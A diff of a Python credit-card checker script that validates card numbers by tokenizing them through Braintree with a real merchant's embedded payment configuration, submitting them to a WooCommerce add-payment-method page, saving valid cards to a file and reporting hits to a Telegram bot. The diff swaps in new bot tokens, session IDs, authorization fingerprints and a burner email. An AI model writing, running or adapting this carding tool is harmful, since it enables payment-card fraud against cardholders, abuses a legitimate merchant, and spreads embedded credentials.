@@ -102,7 +102,7 @@ def save_valid_card(ccx):
     with open("valid_cards.txt", "a") as file:
         file.write(f"{ccx}\n")
 #-------[USERNAME FETCH]
-bot_token = "7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg"
+bot_token = "7844307981:AAFqCTbxeNJ6CBglaRc2SazU3CmcBbr9DIw"
 def get_telegram_username(user_id, bot_token):
     try:
         url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={user_id}"
@@ -133,7 +133,7 @@ clear_terminal()
 print(logo)
 typewriter(message, speed=0.08)
 time.sleep(10)
-os.system(f'xdg-open https://t.me/b3ccdrop_bot')
+os.system(f'xdg-open https://t.me/emptyskillbot')
 clear_terminal()
 print(logo)
 user_id = input("Please enter your Telegram user ID: ")
@@ -152,7 +152,7 @@ for y in y:
     bin_code = c[:6]
     if "20" in yy:
         yy = yy.split("20")[1]
-    acc = ['dragonfight001@gmail.com', 'dragonfight002@gmail.com', 'dragonfight003@gmail.com', 'dragonfight004@gmail.com', 'dragonfight005@gmail.com', 'dragonfight006@gmail.com', 'bincryrid@hamham.uk', 'dipflypar@kksm.be', 'duecapas545@choco.la', 'rag481@kmail.li', 'jotdrpry@mirai.re', 'dinmapis@instmail.uk', 'maddubits@sendapp.uk', 'dragontech177@gmail.com', 'himhas407@send4.uk', 'nadiya001@exdonuts.com', 'zipmobsir750@exdonuts.com', 'figlaxno@exdonuts.com', 'cryournet@kksm.be', 'dewask760@send4.uk']
+    acc = ['view99812@gmail.com', 'dragonfight001@gmail.com', 'dragonfight002@gmail.com', 'dragonfight003@gmail.com', 'dragonfight004@gmail.com', 'dragonfight005@gmail.com', 'dragonfight006@gmail.com', 'bincryrid@hamham.uk', 'dipflypar@kksm.be', 'duecapas545@choco.la', 'rag481@kmail.li', 'jotdrpry@mirai.re', 'dinmapis@instmail.uk', 'maddubits@sendapp.uk', 'dragontech177@gmail.com', 'himhas407@send4.uk', 'nadiya001@exdonuts.com', 'zipmobsir750@exdonuts.com', 'figlaxno@exdonuts.com', 'cryournet@kksm.be', 'dewask760@send4.uk']
     email = random.choice(acc)
     print(F) 
     user = user_agent.generate_user_agent()
@@ -206,7 +206,7 @@ for y in y:
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '06b9aa7d-3797-4dc9-8637-bf4fa2866ae3',
+        'sessionId': 'fb65aa9d-126c-482e-af69-b333a9308c7f',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -253,9 +253,9 @@ for y in y:
     data = {
     'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"50d8e6c373af6a35be63667fee0ee5a3","fraud_merchant_id":null,"correlation_id":"06b9aa7d-3797-4dc9-8637-bf4fa286"}',
+    'braintree_cc_device_data': '{"device_session_id":"9c4c63221b7048f1cda725f5e6fc5eaa","fraud_merchant_id":null,"correlation_id":"fb65aa9d-126c-482e-af69-b333a930"}',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzg0NTg3MjgsImp0aSI6Ijk2M2Y0ZmYyLTRiODAtNDgxNS1hNWY4LTgxZDIxZjg2YzY1ZCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319._Tcjb3igVOQLj7Rsea0k9UeQOephGGDV68CSXhYk-hA8tyUh6Qd7jMAPw3eXjb_JXXTELdZxKwPC1cSg82USlw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzg0NjI2NjMsImp0aSI6IjYwZWZjMzlkLTY3MjItNDgyNC04NDY0LTU3Y2QyMjZjZmYzOCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.3fU4IjfKHnk7sG0n6ecl904BC6zDigHFD7ttyXsi7CtiSCawW_qw-AxeXA9nxCi4ZS_1jRBGo6-6dXuQFoOE5Q","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
     'woocommerce-add-payment-method-nonce': nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
@@ -302,7 +302,7 @@ for y in y:
 ✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ EmptySkill 🐾🐐](tg://user?id=6041675516)
 ✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}
 """
-        requests.post(f"https://api.telegram.org/bot7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
+        requests.post(f"https://api.telegram.org/bot7844307981:AAFqCTbxeNJ6CBglaRc2SazU3CmcBbr9DIw/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
 else:
     print(f'[{start_num}] {ccx} >> {result}❌')
     time.sleep(100)
